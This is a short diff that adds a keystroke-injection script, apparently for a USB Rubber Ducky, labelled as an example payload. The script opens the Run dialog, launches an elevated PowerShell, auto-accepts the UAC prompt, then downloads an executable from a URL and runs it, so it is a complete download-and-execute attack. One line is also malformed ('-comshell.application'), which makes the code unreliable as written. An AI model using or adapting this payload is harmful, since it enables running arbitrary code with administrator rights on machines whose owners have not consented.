@@ -1,0 +1,11 @@
+REM enum
+GUI r
+DELAY 200
+REM powershell elevation
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 500
+ALT y
+DELAY 100
+STRING $down = New-Object System.Net.WebClient; $url = 'http://example.com'; $file = 'example.exe'; $down.DownloadFile($url, $file); $exec = New-Object -comshell.application; $exec.shellexecute($file); exit;
+REM end e.g payload
